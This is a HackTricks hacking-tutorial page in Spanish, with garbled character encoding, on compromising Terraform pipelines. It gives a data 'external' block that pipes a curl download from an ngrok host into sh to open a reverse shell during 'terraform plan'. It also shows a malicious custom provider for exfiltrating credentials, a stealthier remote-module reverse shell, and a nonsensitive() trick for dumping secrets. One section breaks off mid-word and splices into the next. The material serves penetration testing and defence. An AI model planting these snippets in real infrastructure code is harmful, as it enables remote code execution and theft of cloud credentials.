# Seguridad de Terraform

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n b치sica

HashiCorp Terraform es una herramienta de **infraestructura como c칩digo** que te permite definir tanto **recursos en la nube como en local** en archivos de configuraci칩n legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes usar un flujo de trabajo consistente para aprovisionar y administrar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede administrar componentes de bajo nivel como recursos de c칩mputo, almacenamiento y redes, as칤 como componentes de alto nivel como entradas DNS y caracter칤sticas de SaaS.

### 쮺칩mo funciona Terraform?

Terraform crea y administra recursos en plataformas en la nube y otros servicios a trav칠s de sus interfaces de programaci칩n de aplicaciones (API). Los proveedores permiten que Terraform funcione con pr치cticamente cualquier plataforma o servicio con una API accesible.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp y la comunidad de Terraform ya han escrito **m치s de 1700 proveedores** para administrar miles de tipos diferentes de recursos y servicios, y este n칰mero sigue creciendo. Puedes encontrar todos los proveedores p칰blicamente disponibles en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog y muchos m치s.

El flujo de trabajo principal de Terraform consta de tres etapas:

* **Escribir:** Definir recursos, que pueden estar en m칰ltiples proveedores y servicios en la nube. Por ejemplo, puedes crear una configuraci칩n para implementar una aplicaci칩n en m치quinas virtuales en una red de VPC con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecuci칩n que describe la infraestructura que crear치, actualizar치 o destruir치 en funci칩n de la infraestructura existente y tu configuraci칩n.
* **Aplicar:** Con la aprobaci칩n, Terraform realiza las operaciones propuestas en el orden correcto, respetando cualquier dependencia de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el n칰mero de m치quinas virtuales en esa VPC, Terraform recrear치 la VPC antes de escalar las m치quinas virtuales.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise te permite **ejecutar comandos** como `terraform plan` o `terraform apply` de forma remota en una **versi칩n alojada por ti de Terraform Cloud**. Por lo tanto, si encuentras la **clave API** para acceder a ese servidor de Terraform, puedes **comprometerlo**.\
Para obtener m치s informaci칩n, consulta:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laboratorio de Terraform

Solo instala Terraform en tu computadora.

Aqu칤 tienes una [gu칤a](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aqu칤 tienes la [mejor manera de descargar Terraform](https://www.terraform.io/downloads).

## RCE en Terraform

Terraform **no tiene una plataforma que exponga una p치gina web o un servicio de red** que podamos enumerar, por lo tanto, la 칰nica forma de comprometer Terraform es **poder agregar/modificar archivos de configuraci칩n de Terraform**.

Sin embargo, Terraform es un componente **muy sensible** para comprometer porque tendr치 **acceso privilegiado** a diferentes ubicaciones para que pueda funcionar correctamente.

La principal forma para que un atacante pueda comprometer el sistema donde se ejecuta Terraform es **comprometer el repositorio que almacena las configuraciones de Terraform**, porque en alg칰n momento se van a **interpretar**.

De hecho, hay soluciones por ah칤 que **ejecutan autom치ticamente terraform plan/apply despu칠s de que se crea un PR**, como **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Si puedes comprometer un archivo de Terraform, hay diferentes formas en que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan es el **comando m치s utilizado** en Terraform y los desarrolladores/soluciones que usan Terraform lo llaman todo el tiempo, por lo que la **forma m치s f치cil de obtener RCE** es asegurarse de envenenar un archivo de configuraci칩n de Terraform que ejecutar치 comandos arbitrarios en un `terraform plan`.

#### Usando un proveedor externo

Terraform ofrece el proveedor [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), que proporciona una forma de interactuar entre Terraform y programas externos. Puedes usar el origen de datos `external` para ejecutar c칩digo arbitrario durante un `plan`.

Inyectar en un archivo de configuraci칩n de Terraform algo como lo siguiente ejecutar치 un shell inverso cuando se ejecute `terraform plan`:

```javascript
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Usando un proveedor personalizado

Cualquiera puede escribir un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) y publicarlo en el [Registro de Terraform](https://registry.terraform.io/). Tambi칠n podr칤as intentar extraer un proveedor personalizado de un registro privado.

Eso es todo:

* escribe un proveedor personalizado que ejecute alg칰n c칩digo malicioso (como la exfiltraci칩n de credenciales o datos de clientes)
  * publ칤calo en el Registro de Terraform
  * agrega el proveedor al c칩digo de Terraform en una rama de caracter칤sticas
  * abre un PR para la rama de caracter칤sticas

```javascript
 terraform {
        required_providers {
            evil = {
                source  = "evil/evil"
                    version = "1.0"
            }
        }
    }

provider "evil" {}
```

Dado que el proveedor se extraer치 durante el `init` y ejecutar치 alg칰n c칩digo durante el `plan`, tienes una ejecuci칩n de c칩digo arbitrario.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando una referencia externa

Ambas opciones mencionadas son 칰tiles pero no muy sigilosas (la segunda es m치s sigilosa pero m치s compleja que la primera). Puedes realizar este ataque incluso de una manera **m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el shell inverso directamente al archivo de Terraform, puedes **cargar un recurso externo** que contenga el shell inverso:

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Puedes encontrar el c칩digo del shell inverso en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, usa la funci칩n **ref** para ocultar el **c칩digo de shell invers
## Volcado de Secretos

Puede hacer que los **valores secretos utilizados por terraform se vuelquen** ejecutando `terraform apply` agregando al archivo terraform algo como:

```json
output "dotoken" {
  value = nonsensitive(var.do_token)
}
```

## Herramientas de Auditor칤a

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an치lisis est치tico de su c칩digo terraform para detectar posibles configuraciones incorrectas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de c칩digo est치tico para la Infraestructura como C칩digo.

## Referencias

* [Atlantis Security](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulte los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>